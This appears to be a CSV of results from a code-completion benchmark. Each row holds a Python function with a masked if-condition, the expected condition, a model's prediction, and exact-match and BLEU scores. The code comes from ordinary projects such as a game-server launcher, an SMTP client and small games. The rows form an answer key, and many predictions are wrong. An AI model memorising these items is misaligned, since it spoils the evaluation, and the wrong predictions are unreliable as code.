input_function,expected_condition,predicted_condition,exact_match,bleu_score
"def get_save_file_name(self, save): saveGamePath = 'Astro\\Saved\\SaveGames' saveGamePath = ntpath.join(self.astroPath, saveGamePath) fullName = None if: c = 'c' else: c = '' if save['date']: date = save['date'] else: date = '' saveFileName = glob.glob(saveGamePath + f""/{save['name']}${c}{date}.savegame"") if len(saveFileName) > 0: fullName = saveFileName[0] else: saveFileName = glob.glob(saveGamePath + f""/{save['name']}.savegame"") if len(saveFileName) > 0: fullName = saveFileName[0] saveFileName = ntpath.basename(fullName) return (fullName, saveFileName)",save['bHasBeenFlaggedAsCreativeModeSave'],self.astroConfig.mode == 'Windows' or self.astroConfig.mode == 'Windows',0.0,0.0
"def saveGame(self, name=None, shutdown=False): if: return False self.setStatus('saving') self.busy = 'Saving' AstroLogging.logPrint('Saving the current game...') self.AstroRCON.DSSaveGame(name) time.sleep(0.5) if not shutdown: self.getSaves() self.busy = False",self.AstroRCON is None or not self.AstroRCON.connected,self.AstroRCON is None,0.0,24.659696394160658
def newSaveGame(self): if: return False self.setStatus('newsave') self.busy = 'NewSave' AstroLogging.logPrint('Starting a new savegame...') self.AstroRCON.DSNewGame() self.AstroRCON.DSSaveGame() self.getSaves() self.busy = False,self.AstroRCON is None or not self.AstroRCON.connected,self.AstroRCON is None or not self.AstroRCON.connected,1.0,100.00000000000004
"def run(self): certFile = None keyFile = None if: certFile = self.launcher.launcherConfig.SSLCertFile keyFile = self.launcher.launcherConfig.SSLKeyFile if ntpath.exists(keyFile) and ntpath.exists(certFile): self.ssl = True else: AstroLogging.logPrint('No SSL Certificates specified. Defaulting to HTTP', 'warning') if self.ssl: sslPort = self.launcher.launcherConfig.SSLPort ssl_options = {'certfile': ntpath.join(self.launcher.launcherPath, certFile), 'keyfile': ntpath.join(self.launcher.launcherPath, keyFile)} self.listen(sslPort, ssl_options=ssl_options) url = f""https://localhost{(':' + str(sslPort) if sslPort != 443 else '')}{(self.baseURL + '/' if self.baseURL else '')}"" else: self.listen(self.port) url = f""http://localhost{(':' + str(self.port) if self.port != 80 else '')}{(self.baseURL + '/' if self.baseURL else '')}"" AstroLogging.logPrint(f'Running a web server at {url}') if self.passwordHash == '': AstroLogging.logPrint(f'SECURITY ALERT: Visit {url} to set your password!', 'warning') tornado.ioloop.IOLoop.instance().start()",self.launcher.launcherConfig.EnableWebServerSSL,self.launcher.launcherConfig.SSLEnabled,0.0,80.91067115702207
"def post(self): self.WS.get_client_id(self) if: data = tornado.escape.json_decode(self.request.body) if 'save' in data and data['save'] is not None: saveData = data['save'] t = Thread(target=self.launcher.DedicatedServer.deleteSaveGame, args=(saveData,)) t.daemon = True t.start() self.write({'message': 'Success'}) else: self.write({'message': 'Not Authenticated'})",self.current_user == b'admin',self.current_user == b'admin',1.0,100.00000000000004
"def write(self, configFile): for section in self.__dict__.keys(): configFile.write(f'[{section}]\n') properties = self.__dict__[section] for p, v in properties.items(): if: for item in v: configFile.write(f'{p}={item}\n') else: configFile.write(f'{p}={v}\n')","isinstance(v, list)","isinstance(v, list)",1.0,100.00000000000004
"@staticmethod def get_encoding(filePath): pathname = ntpath.dirname(filePath) if: os.makedirs(pathname) with open(filePath, 'a+', encoding='utf_8'): pass with open(filePath, 'rb') as fP: rawdata = fP.read() result = chardet.detect(rawdata) charenc = result['encoding'] return charenc",pathname and (not ntpath.exists(pathname)),not os.path.exists(pathname),0.0,37.40548510898885
"def socket_server(port, secret, tcp): try: if: serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) else: serversocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) serversocket.settimeout(10) serversocket.bind(('0.0.0.0', port)) if: serversocket.listen(1) while 1: connection = None if: connection, _client_address = serversocket.accept() while True: if: data = connection.recv(32) else: data = serversocket.recv(32) if data == secret: if: connection.close() else: serversocket.close() return True else: return False except: return False",tcp,tcp,1.0,0.0
"@classmethod def _process_exception(cls, exception_handler, event, context, exception): exception_processed = False if: try: handler_function = cls.import_module_and_get_function(exception_handler) exception_processed = handler_function(exception, event, context) except Exception as cex: logger.error(msg='Failed to process exception via custom handler.') print(cex) return exception_processed",exception_handler,"isinstance(exception_handler, str)",0.0,20.556680845025987
"def get_cert_and_update_domain(zappa_instance, lambda_name, api_stage, domain=None, manual=False): """""" Main cert installer path. """""" try: create_domain_key() create_domain_csr(domain) get_cert(zappa_instance) create_chained_certificate() with open('{}/signed.crt'.format(gettempdir())) as f: certificate_body = f.read() with open('{}/domain.key'.format(gettempdir())) as f: certificate_private_key = f.read() with open('{}/intermediate.pem'.format(gettempdir())) as f: certificate_chain = f.read() if: if domain: if not zappa_instance.get_domain_name(domain): zappa_instance.create_domain_name(domain_name=domain, certificate_name=domain + '-Zappa-LE-Cert', certificate_body=certificate_body, certificate_private_key=certificate_private_key, certificate_chain=certificate_chain, certificate_arn=None, lambda_name=lambda_name, stage=api_stage) print('Created a new domain name. Please note that it can take up to 40 minutes for this domain to be created and propagated through AWS, but it requires no further work on your part.') else: zappa_instance.update_domain_name(domain_name=domain, certificate_name=domain + '-Zappa-LE-Cert', certificate_body=certificate_body, certificate_private_key=certificate_private_key, certificate_chain=certificate_chain, certificate_arn=None, lambda_name=lambda_name, stage=api_stage) else: print('Cerificate body:\n') print(certificate_body) print('\nCerificate private key:\n') print(certificate_private_key) print('\nCerificate chain:\n') print(certificate_chain) except Exception as e: print(e) return False return True",not manual,manual,0.0,0.0
"def human_size(num, suffix='B'): """""" Convert bytes length to a human-readable version """""" for unit in ('', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi'): if: return '{0:3.1f}{1!s}{2!s}'.format(num, unit, suffix) num /= 1024.0 return '{0:.1f}{1!s}{2!s}'.format(num, 'Yi', suffix)",abs(num) < 1024.0,abs(num) < 1024.0,1.0,100.00000000000004
"def copy_file(src, dst, item): s = os.path.join(src, item) d = os.path.join(dst, item) if: if os.path.lexists(d): os.remove(d) os.symlink(os.readlink(s), d) if metadata: try: st = os.lstat(s) mode = stat.S_IMODE(st.st_mode) os.lchmod(d, mode) except Exception: pass elif os.path.isdir(s): copytree(s, d, metadata, symlinks, ignore) else: shutil.copy2(s, d) if metadata else shutil.copy(s, d)",symlinks and os.path.islink(s),os.path.islink(s),0.0,77.88007830714052
"def kernel(self, cosmo, z, ell): """""" Compute the radial kernel for all nz bins in this probe. Returns: -------- radial_kernel: shape (nbins, nz) """""" z = np.atleast_1d(z) pzs, m = self.params[:2] kernel = weak_lensing_kernel(cosmo, pzs, z, ell) if: bias = self.params[2] kernel += nla_kernel(cosmo, pzs, bias, z, ell) if isinstance(m, list): m = np.expand_dims(np.stack([mi for mi in m], axis=0), 1) kernel *= 1.0 + m return kernel",self.config['ia_enabled'],len(self.params) > 2,0.0,11.044795567078939
"def __call__(self, z): """"""Computes the normalized n(z)"""""" if: self._norm = simps(lambda t: self.pz_fn(t), 0.0, self.config['zmax'], 256) return self.pz_fn(z) / self._norm",self._norm is None,self._norm is None,1.0,100.00000000000004
"def play(): x = entry_1.get() y = entry_2.get() import turtle import time import random root = turtle.TurtleScreen(canvas) root.bgcolor('black') root.bgpic('ladder_game_images/ladder.gif') cutie = turtle.RawTurtle(root) cutie.color(str(x)) cutie.shape('circle') cutie.penup() cutie.speed(2) cutie.setposition(-230, -235) lutie = turtle.RawTurtle(root) lutie.color(str(y)) lutie.shape('circle') lutie.penup() lutie.speed(2) lutie.setposition(-230, -235) pen = turtle.RawTurtle(root) pen.pensize(2) dice = turtle.RawTurtle(root) dice.color('white') dice.speed(0) dice.penup() dice.setposition(300, 100) dice.hideturtle() position = {2: [2, -179, -235], 3: [3, -128, -235], 4: [4, -77, -235], 5: [5, -26, -235], 6: [6, 25, -235], 7: [7, 76, -235], 8: [8, 127, -235], 9: [9, 178, -235], 10: [10, 229, -235], 11: [11, 229, -184], 12: [12, 178, -184], 13: [13, 127, -184], 14: [14, 76, -184], 15: [15, 25, -184], 16: [16, -26, -184], 17: [17, -77, -184], 18: [18, -128, -184], 19: [19, -179, -184], 20: [20, -230, -184], 21: [21, -230, -133], 22: [22, -179, -133], 23: [23, -128, -133], 24: [24, -77, -133], 25: [25, -26, -133], 26",new_pos == 100,random.random() < 0.5,0.0,0.0
"def get_available_actions(room, player): actions = OrderedDict() print('Choose an action: ') if: action_adder(actions, 'i', player.print_inventory, 'Print inventory') if isinstance(room, world.TraderTile): action_adder(actions, 't', player.trade, 'Trade') if isinstance(room, world.EnemyTile) and room.enemy.is_alive(): action_adder(actions, 'a', player.attack, 'Attack') else: if world.tile_at(room.x, room.y - 1): action_adder(actions, 'n', player.move_north, 'Go north') if world.tile_at(room.x, room.y + 1): action_adder(actions, 's', player.move_south, 'Go south') if world.tile_at(room.x + 1, room.y): action_adder(actions, 'e', player.move_east, 'Go east') if world.tile_at(room.x - 1, room.y): action_adder(actions, 'w', player.move_west, 'Go west') if player.hp < 100: action_adder(actions, 'h', player.heal, 'Heal') return actions",player.inventory,"isinstance(room, world.InventoryTile)",0.0,5.522397783539471
"def heal(self): consumables = [item for item in self.inventory if isinstance(item, items.Consumable)] if: print(""You don't have any items to heal you!"") return for i, item in enumerate(consumables, 1): print('Choose an item to use to heal: ') print('{}. {}'.format(i, item)) valid = False while not valid: choice = input('') try: to_eat = consumables[int(choice) - 1] self.hp = max(100, self.hp + to_eat.healing_value) self.inventory.remove(to_eat) print('Current HP: {}'.format(self.hp)) valid = True except (ValueError, IndexError): print('Invalid choice, try again.')",not consumables,len(consumables) == 0,0.0,6.567274736060395
"def modify_player(self, player): if: self.gold_claimed = True player.gold = player.gold + self.gold print('+{} gold added.'.format(self.gold))",not self.gold_claimed,player.gold != self.gold,0.0,20.556680845025987
"def trade(self, buyer, seller): for i, item in enumerate(seller.inventory, 1): print('{}. {} - {} Gold'.format(i, item.name, item.value)) while True: user_input = input('Choose an item or press Q to exit: ') if: return else: try: choice = int(user_input) to_swap = seller.inventory[choice - 1] self.swap(seller, buyer, to_swap) except ValueError: print('Invalid choice!')","user_input in ['Q', 'q']",user_input == 'Q',0.0,19.692104496063735
"def move(self): scored = False for tubes in self.__tubes: for tube in tubes: if: x2 = self.__background.bbox(tube[0])[2] if self.__width / 2 - self.__bird_w / 2 - self.__move < x2: if x2 <= self.__width / 2 - self.__bird_w / 2: if not tube[0] in self.__pastTubes: self.__score_method() self.__pastTubes.append(tube[0]) scored = True for body in tube: self.__background.move(body, -self.__move, 0)",not scored,not scored,1.0,0.0
"def run(self): if: return if len(self.__tubes) >= 1 and self.__background.bbox(self.__tubes[0][0][0])[2] <= 0: for tube in self.__tubes[0]: for body in tube: self.__background.delete(body) self.__background.tubeImages[0].remove(self.__background.tubeImages[0][0]) self.__tubes.remove(self.__tubes[0]) self.__pastTubes.remove(self.__pastTubes[0]) if self.__distance >= self.__minDistance: self.createNewTubes() else: self.__distance += self.__move self.move() self.__background.after(self.__animation_speed, self.run)",self.__stop,len(self.__tubes) == 0,0.0,23.462350320528007
def search(search): with open('Movies.json') as file: data = json.loads(file.read()) for movie in data: if: return movie['year'],movie['title'] == search,search.search(movie['name']),0.0,11.339582221952005
"def is_solution(perm): for i1, i2 in it.combinations(range(len(perm)), 2): if: return False return True",abs(i1 - i2) == abs(perm[i1] - perm[i2]),perm[i1] != perm[i2],0.0,19.905304276733933
"def loginToSMTPServer(self): self.loginPushButton.setEnabled(False) mailServer = self.mailserverLineEdit.text() if bool(re.search('^\\w+\\.\\w+\\.[a-zA-z]{1,3}$', self.mailserverLineEdit.text())) else None serverPort = int(self.serverportLineEdit.text()) username = self.usernameLineEdit.text() if bool(re.search('^[\\w\\.\\+\\-]+\\@[\\w]+\\.[a-z]{2,3}$', self.usernameLineEdit.text())) else None password = self.passwordLineEdit.text() startTls = self.starttlsRadioButton.isChecked() useSsl = self.usesslRadioButton.isChecked() if: self.msgBox = QtWidgets.QMessageBox(self.centralwidget) self.msgBox.setWindowTitle('Invalid Credentials') self.msgBox.setIcon(QMessageBox.Critical) self.msgBox.setText('Please ensure proper credentials are given, make sure to check if the mail server and username and correct.') self.msgBox.setStandardButtons(QMessageBox.Ok) self.msgBox.exec_() self.loginPushButton.setEnabled(True) return loggedIn = False error = None context = ssl.create_default_context() global server if startTls: try: server = smtplib.SMTP(mailServer, serverPort) server.ehlo() server.starttls(context=context) server.ehlo() server.login(username, password) loggedIn = True except Exception as e: error = str(e) elif useSsl: try: server = smtplib.SMTP_SSL(mailServer, serverPort, context=context) server.login(username, password) loggedIn = True except Exception as e: error = str(e) else: self.msgBox = QtWidgets.QMessageBox(self.centralwidget) self.msgBox.setWindowTitle('Select Connection Type') self.msgBox.setIcon(QMessageBox.Information) self.msgBox.setText(""Please select connection type, 'STARTTLS' or 'USESSL', to ensure the security of the connection."") self.msgBox.setStandardButtons(QMessageBox.Ok)",not mailServer or not username,not (mailServer or username or useSsl or startTls or useSsl),0.0,8.054496384843702
"def postMailStuff(self): self.messageGroupBox.setEnabled(True) if: self.msgBox = QtWidgets.QMessageBox(self.centralwidget) self.msgBox.setWindowTitle('Mail Error') self.msgBox.setIcon(QMessageBox.Critical) self.msgBox.setText('An error occured while trying to send the email. Please try again.') self.msgBox.setInformativeText(""Click 'Show Details' to check the error log."") self.msgBox.setDetailedText(mailSendError) self.msgBox.setStandardButtons(QMessageBox.Ok) self.msgBox.exec_() else: self.msgBox = QtWidgets.QMessageBox(self.centralwidget) self.msgBox.setWindowTitle('Mail Sent Successful') self.msgBox.setIcon(QMessageBox.Information) self.msgBox.setText('Your mail has been sent successfully. You can send another mail if you want to.') self.msgBox.setInformativeText(""Please make sure to click on 'Quit' to close the SMTP connection and close the application properly."") self.msgBox.setStandardButtons(QMessageBox.Ok) self.msgBox.exec_() self.toLineEdit.clear() self.subjectLineEdit.clear() self.messagePlainTextEdit.clear() global files files = None self.attachmentsLineEdit.setText('None')",mailSendError,self.showError,0.0,0.0
"def save_file(ls, title): if: os.mkdir('./page_links') fname = './page_links/' + '_'.join(title.split()) + '.txt' with open(fname, 'w', encoding='utf8') as outfile: content = '\n'.join(ls) outfile.write(content) print(f'File saved in directory {fname}')",not os.path.exists('./page_links'),not os.path.exists('./page_links'),1.0,100.00000000000004
"def ResolSelector(): sel_res.set('None') typ = sel_vid_typ.get() format = sel_format.get() prefix = typ + ':' + format + '@' for i in vid: temp = str(i) if: vres.append(temp[len(prefix):]) vid_res_label = Label(main_frame, text='Video Resol:', bg='#080808', foreground='white', font=('Helvetica', 16, 'bold'), anchor=W, justify=LEFT) vid_res_label.place(relx=0.2, rely=0.66, relwidth=0.5, relheight=0.06) res_drop = OptionMenu(main_frame, sel_res, *vres) res_drop.place(relx=0.4, rely=0.66, relwidth=0.1, relheight=0.06) confirm_btn = Button(main_frame, text='Confirm', bg='#66ff00', font=('Helvetica', 14), command=PathSelBtn) confirm_btn.place(relx=0.52, rely=0.66, relwidth=0.1, relheight=0.06)",temp[:len(prefix)] == prefix and temp[len(prefix):] not in vres,temp.startswith(prefix),0.0,1.9095821243747986
"def find_broken_links(address): """"""Given a base URL, extracts all links found in elements that may possess them. Additionally, collect the broken ones (i.e., request returns HTTP error code)"""""" links = [] elem_dict = {'a': 'href', 'img': 'src'} res = requests.get(address) http_encoding = res.encoding if 'charset' in res.headers.get('content-type', '').lower() else None html_encoding = bs4.dammit.EncodingDetector.find_declared_encoding(res.content, is_html=True) encoding = html_encoding or http_encoding soup = bs4.BeautifulSoup(res.content, 'html.parser', from_encoding=encoding) for element, attribute in iter(elem_dict.items()): try: for link_elem in soup.select(element): if: url_to_test = link_elem[attribute] if link_elem[attribute].startswith('#'): continue address_split = urlsplit(link_elem[attribute]) if address_split.scheme == '' and address_split.netloc == '': url_to_test = address + link_elem[attribute] elif address_split.scheme == '' and (address_split.netloc != '' or address_split.path != ''): if re.match('^//', url_to_test): path_match = re.search('(?<=//)\\S+', url_to_test) url_to_test = path_match.group(0) url_to_test = 'https://' + url_to_test if link_broken(url_to_test): links.append(url_to_test) except requests.HTTPError as http_excpt: print(http_excpt) return links",link_elem.has_attr(attribute),attribute in link_elem,0.0,15.719010513286515
"def get_psw_leak_count(hashes, hash_to_check): hashes = (line.split(':') for line in hashes.text.splitlines()) for h, count in hashes: if: return count return 0",h == hash_to_check,h in hash_to_check,0.0,55.780028607687655
"def handle_args(args): if: print(usage) elif len(args) == 2 and args[1].endswith('.txt'): sys.exit(main(open(sys.argv[1], 'r'))) elif len(args) > 1: sys.exit(main(args[1:])) else: print(usage)",args[1] == '-h' or args[1] == '--help',len(args) == 0,0.0,4.635551866221845
"def pingaddress(server): serverip = server[0] if: serverport = str(server[1]) else: serverport = '' try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) if: unit_result = sock.connect_ex((server[0], server[1])) else: unit_result = sock.connect_ex((server[0], 80)) sock.close() return unit_result except socket.gaierror: print(""Connection problem with '"" + serverip + ':' + serverport + ""'.\nCheck whether the website/server entered exists or not."") exit()",len(server) == 2,len(server) == 2,1.0,100.00000000000004
"def execute(self) -> SingleAPIResponse[_ReturnT]: """"""Execute the query. .. tip:: This is the last method called, after the query is built. Returns: :class:`SingleAPIResponse` Raises: :class:`APIError` If the API raised an error. """""" r = self.session.request(self.http_method, self.path, json=self.json, params=self.params, headers=self.headers) try: if: return SingleAPIResponse[_ReturnT].from_http_request_response(r) else: raise APIError(r.json()) except ValidationError as e: raise APIError(r.json()) from e except JSONDecodeError: raise APIError(generate_default_error_message(r))",200 <= r.status_code <= 299,r.ok,0.0,0.0
"def execute(self) -> Optional[SingleAPIResponse[_ReturnT]]: r = None try: r = SyncSingleRequestBuilder[_ReturnT].execute(self) except APIError as e: if e.details and 'The result contains 0 rows' in e.details: return None if: raise APIError({'message': 'Missing response', 'code': '204', 'hint': 'Please check traceback of the code', 'details': ""Postgrest couldn't retrieve response, please check traceback of the code. Please create an issue in `supabase-community/postgrest-py` if needed.""}) return r",not r,r is None,0.0,0.0
"def websocket_disconnect(self, close_code): if: t = self.subscribers[self.channel_name] if t is not None: t.end() del self.subscribers[self.channel_name] logging.info('Client successfully removed')",self.channel_name in self.subscribers,close_code == WebSocket.CLOSE_CODE,0.0,4.990049701936832
